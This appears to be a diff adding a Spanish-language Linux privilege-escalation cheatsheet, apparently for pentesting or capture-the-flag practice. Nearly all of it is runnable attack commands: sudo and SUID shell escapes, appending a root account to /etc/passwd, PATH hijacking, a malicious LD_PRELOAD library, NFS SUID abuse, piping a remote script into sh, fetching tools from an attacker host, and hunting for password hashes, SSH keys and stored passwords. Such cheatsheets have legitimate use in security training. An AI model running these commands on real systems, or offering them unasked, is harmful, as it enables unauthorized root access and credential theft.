@@ -1,0 +1,235 @@
+================================================================================
+                  PRIVILEGE ESCALATION LINUX - CHEATSHEET
+                  Autor: D1n0
+================================================================================
+
+--- ENUMERACIÓN INICIAL ---
+
+id                                # Grupos a los que pertenezco y UID/GID
+whoami                            # Usuario actual
+hostname                          # Nombre del equipo
+uname -a                          # Versión kernel + arquitectura + OS
+cat /etc/os-release               # Distro y versión
+cat /proc/version                 # Versión del kernel compilada + compilador usado
+
+
+--- USUARIOS Y GRUPOS ---
+
+cat /etc/passwd                   # Todos los usuarios del sistema
+cat /etc/shadow                   # Hashes de passwords (requiere root)
+cat /etc/group                    # Grupos y sus miembros
+sudo -l                           # Qué puede ejecutar el usuario con sudo
+last                              # Últimos logins
+w                                 # Usuarios conectados ahora
+
+
+--- SUDO ---
+
+# Ver permisos sudo sin password
+sudo -l
+
+# Si aparece (ALL) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/bash'
+
+# Si aparece (ALL) NOPASSWD: /usr/bin/find
+sudo find / -exec /bin/bash \; -quit
+
+# Si aparece (ALL) NOPASSWD: /usr/bin/python3
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+# Si aparece (ALL) NOPASSWD: /usr/bin/less / more / man
+sudo less /etc/passwd    # dentro: !/bin/bash
+
+# GTFOBins para cualquier binario: https://gtfobins.github.io
+
+
+--- SUID / SGID ---
+
+# Buscar binarios con SUID
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# Buscar SGID
+find / -perm -2000 -type f 2>/dev/null
+
+# Combinado SUID + SGID
+find / -perm /6000 -type f 2>/dev/null
+
+# Binarios SUID interesantes:
+#   /usr/bin/bash       bash -p  (shell como owner)
+#   /usr/bin/find       find / -exec /bin/bash -p \;
+#   /usr/bin/vim        vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
+#   /usr/bin/python     python -c 'import os; os.execl("/bin/sh","sh","-p")'
+#   /usr/bin/nmap       nmap --interactive  ->  !sh
+#   /usr/bin/cp         cp /bin/bash /tmp/bash; /tmp/bash -p
+#   /usr/bin/env        env /bin/bash -p
+
+
+--- CAPABILITIES ---
+# Permisos granulares del kernel asignados a binarios concretos.
+# En vez de darle SUID completo a un binario, se le da solo la capacidad
+# necesaria (ej: cap_setuid para cambiar de UID). Si está mal configurado,
+# se puede abusar para escalar a root igual que con SUID.
+
+# Buscar binarios con capabilities
+getcap -r / 2>/dev/null
+
+# Ejemplo explotable: python3 con cap_setuid
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+
+--- CRON JOBS ---
+# Tareas programadas que se ejecutan automáticamente cada cierto tiempo.
+# Si un script que ejecuta root tiene permisos de escritura para otros
+# usuarios, podemos modificarlo para que ejecute nuestra shell.
+
+# Ver crontab del usuario actual
+crontab -l
+
+# Crontabs del sistema
+cat /etc/crontab
+cat /etc/cron.d/*
+ls -la /etc/cron.*
+
+# Buscar procesos ejecutándose periódicamente (pspy)
+./pspy64
+
+
+--- FICHEROS CON PERMISOS DÉBILES ---
+
+# Ficheros escribibles por todos
+find / -writable -type f 2>/dev/null | grep -v proc
+find / -perm -o+w -type f 2>/dev/null
+
+# Directorios escribibles
+find / -writable -type d 2>/dev/null
+
+# Ficheros importantes que podrían ser escribibles
+ls -la /etc/passwd
+ls -la /etc/shadow
+ls -la /etc/sudoers
+
+# Si /etc/passwd es escribible: añadir usuario root
+echo 'hacker:$(openssl passwd hacked):0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacker  # password: hacked
+
+
+--- SERVICIOS Y PROCESOS ---
+
+ps aux                            # Todos los procesos
+ps aux | grep root                # Procesos de root
+netstat -tulpn                    # Puertos en escucha (servicios internos)
+ss -tulpn                         # Alternativa a netstat
+cat /etc/services
+
+
+--- BINARIOS CON PATH HIJACKING ---
+# Si un script ejecutado por root llama a un comando sin ruta absoluta
+# (ej: "service" en vez de "/usr/sbin/service"), podemos crear un binario
+# malicioso con ese nombre y ponerlo antes en el PATH para que root
+# ejecute el nuestro en su lugar.
+
+# Ver PATH del sistema
+echo $PATH
+
+# Crear binario malicioso en directorio con escritura antes en PATH
+echo '/bin/bash' > /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+# Ahora cuando el script llame a "service", ejecutará el nuestro
+
+
+--- KERNEL EXPLOITS ---
+
+# Ver versión del kernel
+uname -r
+uname -a
+
+# Buscar exploits conocidos
+searchsploit linux kernel $(uname -r | cut -d- -f1)
+searchsploit linux kernel [MAJOR.MINOR]     # ej: 4.4 / 5.10
+searchsploit linux local privilege escalation
+
+# Exploits clásicos de kernel:
+#   Dirty COW (CVE-2016-5195)   kernels < 4.8.3
+#   OverlayFS (CVE-2023-0386)
+#   PwnKit (CVE-2021-4034)      pkexec SUID
+
+# PwnKit - verificar si pkexec es vulnerable
+ls -la /usr/bin/pkexec
+# Exploit: https://github.com/berdav/CVE-2021-4034
+
+
+--- VARIABLES DE ENTORNO Y LD_PRELOAD ---
+# LD_PRELOAD fuerza al sistema a cargar una librería antes que cualquier otra.
+# Si sudo conserva esta variable (env_keep+=LD_PRELOAD), podemos inyectar
+# una librería maliciosa que se ejecute con los privilegios del comando sudo.
+
+# Verificar: sudo -l debe mostrar env_keep+=LD_PRELOAD
+
+cat > /tmp/malicious.c << CEOF
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0); setuid(0);
+    system("/bin/bash");
+}
+CEOF
+gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles
+sudo LD_PRELOAD=/tmp/malicious.so find
+
+
+--- NFS (Network File System) ---
+
+# Ver exports NFS del target
+cat /etc/exports
+showmount -e [IP-VICTIMA]
+
+# Si hay no_root_squash en exports: montar y crear SUID
+mkdir /tmp/nfsmount
+mount -t nfs [IP-VICTIMA]:/share /tmp/nfsmount
+cp /bin/bash /tmp/nfsmount/
+chmod +s /tmp/nfsmount/bash
+# En víctima:
+/share/bash -p
+
+
+--- HERRAMIENTAS AUTOMÁTICAS ---
+
+# LinPEAS (más completo)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# LinEnum
+./LinEnum.sh
+
+# linux-exploit-suggester
+./linux-exploit-suggester.sh
+
+# pspy (ver procesos sin root)
+./pspy64
+
+# Transferir herramientas a la víctima
+# Desde atacante:
+python3 -m http.server 8080
+# En víctima:
+wget http://[IP-ATACANTE]:8080/linpeas.sh
+curl http://[IP-ATACANTE]:8080/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh
+
+
+--- CHECKLIST RÁPIDA ---
+
+[ ] sudo -l
+[ ] find / -perm -4000 2>/dev/null          (SUID)
+[ ] getcap -r / 2>/dev/null                 (capabilities)
+[ ] crontab -l && cat /etc/crontab          (cron jobs)
+[ ] ls -la /etc/passwd                      (writeable?)
+[ ] uname -r                                (kernel exploits)
+[ ] netstat -tulpn                          (servicios internos)
+[ ] env | grep -i pass                      (credenciales en entorno)
+[ ] find / -name "*.txt" -readable 2>/dev/null | xargs grep -i password
+[ ] history                                 (comandos previos con passwords)
+[ ] find / -name id_rsa 2>/dev/null         (claves SSH)
+
+================================================================================
